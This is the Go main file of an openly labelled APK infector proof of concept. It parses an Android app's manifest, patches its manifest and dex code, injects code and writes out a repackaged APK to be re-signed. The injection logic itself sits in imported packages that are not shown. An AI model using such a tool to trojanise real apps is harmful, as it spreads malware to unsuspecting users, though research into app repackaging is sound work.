// author: Thatskriptkid (www.orderofsixangles.com)
// You can use my kaitai struct for binary manifest.
// https://github.com/thatskriptkid/Kaitai-Struct-Android-Manifest-binary-XML

package main

import (
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/injector"
	"encoding/xml"
	"fmt"
	"log"
	"os"
)

func isValidFile(path string) bool {
	info, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func main() {

	//setup logging
	logFile, err := os.OpenFile("apkinfector.log", os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}

	defer logFile.Close()

	log.SetOutput(logFile)

	if len(os.Args) < 2 {
		fmt.Println("Usage:\nmain input.apk output.apk")
		return
	}

	if !(isValidFile(os.Args[1]) && isValidFile(os.Args[2])) {
		fmt.Printf("Invalid file path %s %s",os.Args[1], os.Args[2] )
		return
	}
	
	manifestPlainFile, err := os.Create(manifest.PlainPath) // create/truncate the file
	if err != nil {
		log.Panic("Failed to create AndroidManifest plaintext", err)
	}

	enc := xml.NewEncoder(manifestPlainFile)

	enc.Indent("", "\t")

	fmt.Println("Parsing APK...")
	manifest.ParseApk(os.Args[1], enc)
	
	//close before reading
	manifestPlainFile.Close()

	fmt.Println("Patching APK")
	fmt.Println("\t--Patching manifest...")
	manifest.Patch()

	fmt.Println("\t--Patching dex...")
	dex.Patch()

	fmt.Println("Injecting...")
	injector.Inject(os.Args[1], os.Args[2])

	fmt.Println("Done! Now you should sign your apk")
}
